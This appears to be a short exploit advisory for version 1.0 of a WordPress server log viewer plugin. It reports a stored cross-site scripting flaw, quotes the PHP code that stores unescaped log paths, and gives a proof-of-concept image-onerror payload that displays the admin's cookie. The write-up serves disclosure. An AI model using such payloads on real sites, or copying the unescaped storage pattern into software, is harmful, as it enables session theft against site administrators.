# Exploit Author: strider
# Software Link: https://github.com/anttiviljami/wp-server-log-viewer
# Version: 1.0
# Tested on: Debian 10 Buster x64 / Kali Linux
# CVE : None

====================================[Description]====================================
This plugin allows you to add logfiles via wp-admin. The problem here is that the file paths are stored unfiltered/unescaped. This gives the possibility of a persistent XSS attack.


====================================[Codepart]====================================

if( isset( $_GET[&#039;action&#039;] ) && &#039;new&#039; === $_GET[&#039;action&#039;] && isset( $_GET[&#039;logpath&#039;] ) ) {
      // new log was added
      $logs = get_option( &#039;server_logs&#039; );
      if( is_null( $logs ) ) {
        $logs = [];
      }

      $log = trim( $_GET[&#039;logpath&#039;] ); //only trimmed string no escaping
      $logs[] = $log; //here the log will be added without security checks
      $logs = array_values( $logs );

      $index = array_search( $log, $logs );

      update_option( &#039;server_logs&#039;, $logs );

      wp_safe_redirect( admin_url(&#039;tools.php?page=wp-server-log-viewer&log=&#039; . $index) );
    }



====================================[Proof of Concept]====================================
Add new log file to the plugin.
paste this exploit into the form and submit it.

<img src=# onerror=alert(document.cookie);>log.txt

It tries to render an image and triggers the onerror event and prints the cookie. in the tab you see the log.txt

